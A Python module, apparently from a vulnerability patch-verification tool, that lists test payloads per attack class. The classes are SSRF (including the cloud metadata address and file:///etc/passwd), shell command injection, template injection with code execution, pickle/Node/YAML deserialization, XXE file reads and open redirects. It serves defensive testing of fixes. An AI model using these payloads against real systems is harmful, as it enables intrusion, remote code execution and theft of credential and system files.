"""Attack batteries of the input -> effect classes (shadow/effects.py): one source for everything that replays a class.

The `properties` gate replays them against the patched app, the self-audit probes sibling parameters with them, and
the PoC / patcher variants are built from them, so a fix is judged by the same inputs everywhere. Every URL points at a
closed port or a name that cannot resolve: a payload that works, works against nothing real.
"""
from __future__ import annotations

import base64

# a value of the class's input that does the legitimate thing; the fix must keep answering it as before
BENIGN = {"ssrf": "abc", "cmdi": "abc", "ssti": "hello", "deser": "abc", "xxe": "<r>ok</r>", "redirect": "/home"}

SSRF = ["http://127.0.0.1:1/", "http://localhost:1/", "http://169.254.169.254/latest/meta-data/", "http://[::1]:1/",
        "http://2130706433:1/", "http://0x7f000001:1/", "http://0177.0.0.1:1/", "http://127.1:1/",
        "http://10.255.255.1/", "http://192.168.0.1:1/", "http://internal.invalid/", "http://user@127.0.0.1:1/",
        "http://127.0.0.1:1#@example.com/", "file:///etc/passwd", "gopher://127.0.0.1:1/_x"]

CMDI = ["x; id", "x | id", "x && id", "x || id", "x `id`", "x $(id)", "x\nid", "$(id)", "'; id #", "\"; id #",
        "-h; id", "x & id", "x;id"]

SSTI = ["{{ 91*91 }}", "${91*91}", "<%= 91*91 %>", "#{91*91}", "{{91*91}}", "{{ 12345*54321 }}",
        "{{ cycler.__init__.__globals__.os.popen('id').read() }}", "${ T(java.lang.Runtime).getRuntime().exec('id') }",
        "<%= require('child_process').execSync('id') %>"]

_PICKLE = base64.b64encode(b"cos\nsystem\n(S'id'\ntR.").decode()
_NODE = base64.b64encode(b'{"x":"_$$ND_FUNC$$_function(){require(\'child_process\').execSync(\'id\')}"}').decode()
DESER = [_PICKLE, _NODE, 'O:8:"stdClass":0:{}', "!!python/object/apply:os.system ['id']",
         base64.b64encode(b"\xac\xed\x00\x05sr\x00\x11java.util.HashMap\x05\x07").decode()]

_DTD = '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "%s">]><r>&x;</r>'
XXE = [_DTD % "file:///etc/passwd", _DTD % "file:///etc/hostname", _DTD % "http://127.0.0.1:1/x",
       _DTD % "php://filter/convert.base64-encode/resource=/etc/passwd",
       '<?xml version="1.0"?><!DOCTYPE r SYSTEM "http://127.0.0.1:1/evil.dtd"><r/>']

REDIRECT = ["https://evil.example/", "//evil.example", "/\\evil.example", "///evil.example", "https:evil.example",
            "http://evil.example@evil.example/", "HTTPS://EVIL.EXAMPLE/x", "https://evil.example.attacker.invalid/"]

BATTERY = {"ssrf": SSRF, "cmdi": CMDI, "ssti": SSTI, "deser": DESER, "xxe": XXE, "redirect": REDIRECT}
